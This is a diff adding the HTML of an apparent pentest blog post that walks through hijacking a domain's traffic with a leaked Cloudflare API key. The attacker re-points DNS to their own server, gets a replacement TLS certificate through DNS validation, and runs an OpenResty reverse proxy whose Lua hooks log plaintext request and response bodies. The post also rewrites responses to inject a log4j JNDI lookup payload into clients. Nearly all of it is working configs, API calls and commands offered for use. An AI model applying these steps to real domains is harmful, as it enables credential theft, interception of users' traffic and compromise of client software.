@@ -1,0 +1,428 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>利用OpenResty进行域名流量劫持 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="背景攻击者具有修改域名解析记录的权限（比如拥有CloudFlare的API Key），可以修改CNAME或者A记录，想通过修改域名解析记录的方式，获取目标网站的所有流量（包括但不限于POST明文请求）。可以利用OpenResty的Lua扩展功能，记录HTTP请求体和相应的Response。顺嘴提一句，在CloudFalre里面，一般的接口操作都可以用API Key完成，但是一旦涉及到证书的续订下载等操作，需要用CA Key。
+攻击流程首先可以通过API接口查看泄漏的key是否生效：
+查看ZonesGET https://api.cloudflare.com/client/v4/zones
+
+查看Zones对应的DNS记录GET https://api.cloudflare.com/client/v4/zones/&amp;lt;ZONE ID&gt;/dns_records
+
+查看审计日志获取最近的登陆日志、操作日志、客户端IP等："> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="利用OpenResty进行域名流量劫持"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 利用OpenResty进行域名流量劫持</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>攻击者具有修改域名解析记录的权限（比如拥有CloudFlare的API Key），可以修改CNAME或者A记录，想通过修改域名解析记录的方式，获取目标网站的所有流量（包括但不限于POST明文请求）。可以利用OpenResty的Lua扩展功能，记录HTTP请求体和相应的Response。顺嘴提一句，在CloudFalre里面，一般的接口操作都可以用API Key完成，但是一旦涉及到证书的续订下载等操作，需要用CA Key。</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>首先可以通过API接口查看泄漏的key是否生效：</p>
+<h4 id="查看Zones"><a href="#查看Zones" class="headerlink" title="查看Zones"></a>查看Zones</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="查看Zones对应的DNS记录"><a href="#查看Zones对应的DNS记录" class="headerlink" title="查看Zones对应的DNS记录"></a>查看Zones对应的DNS记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="查看审计日志"><a href="#查看审计日志" class="headerlink" title="查看审计日志"></a>查看审计日志</h4><p>获取最近的登陆日志、操作日志、客户端IP等：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/accounts/<span class="token operator">&lt;</span>Account ID<span class="token operator">></span>/audit_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="查看最近的DNS请求数量"><a href="#查看最近的DNS请求数量" class="headerlink" title="查看最近的DNS请求数量"></a>查看最近的DNS请求数量</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_analytics/report?dimensions<span class="token operator">=</span>responseCode,queryName<span class="token operator">&amp;</span><span class="token assign-left variable">metrics</span><span class="token operator">=</span>queryCount<span class="token operator">&amp;</span><span class="token assign-left variable">sort</span><span class="token operator">=</span>+responseCode,-queryName<span class="token operator">&amp;</span><span class="token assign-left variable">filters</span><span class="token operator">=</span>responseCode<span class="token operator">==</span>NOERROR<span class="token operator">&amp;</span><span class="token assign-left variable">since</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T12:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">until</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T18:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">limit</span><span class="token operator">=</span><span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>假如目标网站是https，但是又获取不到https的证书，可以选择使用acme.sh来重新生成另外一份HTTPS证书，因为已经有了DNS的解析权限，可以走DNS验证的方式来获取域名证书：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/root/.acme.sh/acme.sh --issue --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please
+/root/.acme.sh/acme.sh --renew --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>第一个条命令会生成两个TXT解析，利用已有的DNS权限创建对应的TXT解析记录，然后运行第二条命令，不出意外的话可以成功生成证书。这时可以删除这两条TXT记录，注意使用dns认证的方式生成证书不可以自动续订。<br>相关的CloudFlare接口：</p>
+<h4 id="新增DNS-Record"><a href="#新增DNS-Record" class="headerlink" title="新增DNS Record"></a>新增DNS Record</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records
+
+<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"TXT"</span>, <span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"_acme-challenge.&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"TK..."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="删除DNS-Record"><a href="#删除DNS-Record" class="headerlink" title="删除DNS Record"></a>删除DNS Record</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">DELETE https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>不管是CNAME解析还是A解析都可以修改为A解析的方式，劫持域名到自己的服务器，前提是使用OpenResty把反代设置好，配置文件主要参考<a target="_blank" rel="noopener" href="https://gist.github.com/virusdefender/984c2a304001d8de20049301b478700a/revisions">virusdefender师傅</a>：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>
+    listen <span class="token number">80</span><span class="token punctuation">;</span>
+    server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>
+    <span class="token builtin class-name">return</span> <span class="token number">301</span> https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token variable">$request_uri</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span>
+server <span class="token punctuation">&#123;</span>
+	listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>
+	server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>
+    proxy_ssl_server_name on<span class="token punctuation">;</span>
+    proxy_ssl_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>
+    ssl_certificate /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/fullchain.cer<span class="token punctuation">;</span>
+    ssl_certificate_key /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>
+	error_log stderr error<span class="token punctuation">;</span>
+
+	location / <span class="token punctuation">&#123;</span>
+		proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>
+		proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>
+        proxy_set_header X-Forwarded-For <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>
+		proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>
+		proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>
+		proxy_set_header Host <span class="token variable">$host</span><span class="token punctuation">;</span>
+
+
+		<span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        access_by_lua <span class="token string">'
+            ngx.req.read_body();
+        '</span><span class="token punctuation">;</span>
+        body_filter_by_lua <span class="token string">'
+            ngx.ctx.buffered = (ngx.ctx.buffered or "") .. ngx.arg[1]
+            if ngx.arg[2] then
+                ngx.var.resp_body = ngx.ctx.buffered
+            end
+        '</span><span class="token punctuation">;</span>
+        log_by_lua <span class="token string">'
+        local method=ngx.req.get_method();
+        if method == "POST" or (method == "PUT") or (method == "DELETE") then
+            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());
+            if ngx.req.get_body_data() ~= nil then
+                ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");
+            end
+            ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");
+
+        end
+        '</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	access_log /home/wwwlogs/access.log<span class="token punctuation">;</span>
+	error_log /home/wwwlogs/error.log<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果想看记录所有的请求，把上面的请求方法判断去掉就可以了。</p>
+<h3 id="X-Forwarded-For字段"><a href="#X-Forwarded-For字段" class="headerlink" title="X-Forwarded-For字段"></a>X-Forwarded-For字段</h3><p>假如需要劫持的是一个中间代理域名，上游服务器是通过白名单IP来限制访问，获取IP的方式是通过XFF，这时候需要把XFF设置为<code>$remote_addr</code></p>
+<h3 id="Host字段"><a href="#Host字段" class="headerlink" title="Host字段"></a>Host字段</h3><p>这里有一个很奇怪的问题，大概是取决于upstream的配置，有时候需要配置为<code>proxy_set_header Host $host</code>，但是有时候可能是<code>proxy_set_header Host $proxy_host</code>。</p>
+<p>在以上都设置好之后，利用本地hosts绑定的方式先测试网站的接口功能是否正常，生成的日志是否正常。另外可以给80和443端口另外单独做一个默认配置，这样可以防止扫描器等日志出现，只单独记录反代的日志，<br>比如443端口新增一个自定义证书：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl genrsa -out privatekey.pem <span class="token number">2048</span>
+openssl req -new -key privatekey.pem -out private-csr.pem
+openssl x509 -req -days <span class="token number">365</span> -in private-csr.pem -signkey privatekey.pem -out certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>修改OpenResty配置:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>
+        listen       <span class="token number">443</span> ssl<span class="token punctuation">;</span>
+        server_name  localhost default<span class="token punctuation">;</span>
+
+        ssl_certificate      /usr/local/openresty/nginx/certs/certificate.pem<span class="token punctuation">;</span>
+        ssl_certificate_key  /usr/local/openresty/nginx/certs/privatekey.pem<span class="token punctuation">;</span>
+        ssl_session_cache    shared:SSL:1m<span class="token punctuation">;</span>
+        ssl_session_timeout  5m<span class="token punctuation">;</span>
+
+        ssl_ciphers  HIGH:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>MD5<span class="token punctuation">;</span>
+        ssl_prefer_server_ciphers  on<span class="token punctuation">;</span>
+
+        location / <span class="token punctuation">&#123;</span>
+            root   html<span class="token punctuation">;</span>
+            index  index.html index.htm<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>经过上面设置这时候反代已经设置好可以进行流量劫持了，先记录原有的DNS解析，然后通过API修改域名的解析记录，解析道自己的服务器上，必要的情况下需要重新改回来：</p>
+<h4 id="修改解析记录"><a href="#修改解析记录" class="headerlink" title="修改解析记录"></a>修改解析记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUT https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span>
+
+<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"A"</span>, <span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;attack ip>"</span>, <span class="token string">"proxiable"</span><span class="token builtin class-name">:</span> false, <span class="token string">"proxied"</span><span class="token builtin class-name">:</span> false<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="修改Response"><a href="#修改Response" class="headerlink" title="修改Response"></a>修改Response</h2><p>如果有其他的需求，比如修改Response用来测试客户端是否存在fastjson或者log4j漏洞，可以增加以下Lua代码，来修改特定的接口返回值：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">location /some-api <span class="token punctuation">&#123;</span>
+		proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>
+		proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>
+        proxy_set_header X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span> <span class="token punctuation">;</span>
+		proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>
+		proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>
+		proxy_set_header Host   <span class="token variable">$proxy_host</span><span class="token punctuation">;</span>
+
+
+		<span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        access_by_lua <span class="token string">'
+            ngx.req.read_body();
+        '</span><span class="token punctuation">;</span>
+
+        header_filter_by_lua_block <span class="token punctuation">&#123;</span> ngx.header.content_length <span class="token operator">=</span> nil <span class="token punctuation">&#125;</span>
+        body_filter_by_lua <span class="token string">'
+
+            local chunk, eof = ngx.arg[1], ngx.arg[2]
+            local buffered = ngx.ctx.buffered
+            if not buffered then
+            buffered = &#123;&#125;  -- XXX we can use table.new here 
+            ngx.ctx.buffered = buffered
+            end
+            if chunk ~= "" then
+            buffered[#buffered + 1] = chunk
+            ngx.arg[1] = nil
+            end
+            if eof then
+            local whole = table.concat(buffered)
+            ngx.ctx.buffered = nil
+            -- try to unzip
+            -- local status, debody = pcall(com.decode, whole) 
+            -- if status then whole = debody end
+            -- try to add or replace response body
+            -- local js_code = ...
+            -- whole = whole .. js_code
+            ngx.log(ngx.ERR, whole)
+            whole = string.gsub(whole, ".+",  "&#123;\\"@type\\":\\"java.net.Inet6Address\\",\\"value\\":\\"dnslog\\", \\"message\\":\\"$&#123;jndi:ldap://dnslog&#125;\\"&#125;")
+            ngx.arg[1] = whole
+            end
+        '</span><span class="token punctuation">;</span>
+
+        log_by_lua <span class="token string">'
+        local method=ngx.req.get_method();
+         if method == "POST" or (method == "PUT") or (method == "DELETE") then
+            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());
+            if ngx.req.get_body_data() ~= nil then 
+                ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");
+            end
+            
+            ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");
+        end
+        '</span><span class="token punctuation">;</span>
+        
+	<span class="token punctuation">&#125;</span>		<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+	</div>
+
+	
+	<span id="/2023/02/13/cname-hijack-openresty.html" class="leancloud-visitors view" data-flag-title="利用OpenResty进行域名流量劫持">
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/02/14/kafka-rce.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/01/16/pay_vuln.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-02-13 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-article-text">背景</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-article-text">攻击流程</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8BZones"><span class="toc-article-text">查看Zones</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8BZones%E5%AF%B9%E5%BA%94%E7%9A%84DNS%E8%AE%B0%E5%BD%95"><span class="toc-article-text">查看Zones对应的DNS记录</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97"><span class="toc-article-text">查看审计日志</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%80%E8%BF%91%E7%9A%84DNS%E8%AF%B7%E6%B1%82%E6%95%B0%E9%87%8F"><span class="toc-article-text">查看最近的DNS请求数量</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#HTTPS%E8%AF%81%E4%B9%A6"><span class="toc-article-text">HTTPS证书</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%96%B0%E5%A2%9EDNS-Record"><span class="toc-article-text">新增DNS Record</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%88%A0%E9%99%A4DNS-Record"><span class="toc-article-text">删除DNS Record</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-article-text">步骤</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#X-Forwarded-For%E5%AD%97%E6%AE%B5"><span class="toc-article-text">X-Forwarded-For字段</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Host%E5%AD%97%E6%AE%B5"><span class="toc-article-text">Host字段</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BF%AE%E6%94%B9%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95"><span class="toc-article-text">修改解析记录</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%AE%E6%94%B9Response"><span class="toc-article-text">修改Response</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
